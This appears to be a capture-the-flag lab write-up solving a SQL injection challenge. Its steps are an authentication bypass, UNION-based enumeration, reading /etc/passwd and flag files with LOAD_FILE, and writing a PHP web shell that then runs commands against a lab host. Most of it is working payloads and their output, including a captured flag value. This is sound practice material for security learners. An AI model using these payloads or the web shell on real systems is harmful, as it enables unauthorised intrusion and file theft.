# LAB

## By-pass authentication
admin' or '1'='1'-- -


## Recon of number of columns
' order by 1-- 
' order by 2-- 
...
' order by 4-- 
' order by 5-- 
' order by 6-- 

Unknown column '6' in 'order clause'

The table has 5 columns

## Recon of databases info
cn' UNION select 1,@@version,3,4,5-- 

10.3.22-MariaDB-1ubuntu1

cn' UNION select 1,user(),3,4,5-- 
root@localhost

## Check privileges

cn' UNION SELECT 1, super_priv, 3, 4, 5 FROM mysql.user-- -

Y

--> Which means YES

## Get files

cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4, 5-- -


Name
Month
Amount
Tax
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin postgres:x:101:103:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash mysql:x:102:104:MySQL Server,,,:/nonexistent:/bin/false

cn' UNION SELECT 1, LOAD_FILE("/root/flag.txt"), 3, 4, 5-- -

## Inject shell

cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -

http://83.136.251.235:49375/dashboard/shell.php?0=pwd
/var/www/html/dashboard

## Get flag using shell

http://83.136.251.235:49375/dashboard/shell.php?0=cat%20%2Froot%2Fflag.txt

http://83.136.251.235:49375/dashboard/shell.php?0=ls%20-l%20%2Froot%2F

ls%20%2F

bin boot dev etc flag_cae1dadcd174.txt home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var

http://83.136.251.235:49375/dashboard/shell.php?0=cat%20%2Fflag_cae1dadcd174.txt
528d6d9cedc2c7aab146ef226e918396

## Other solution to get flag by requesting the file

' UNION SELECT 1,LOAD_FILE("/flag_cae1dadcd174.txt"),3,4,5-- -
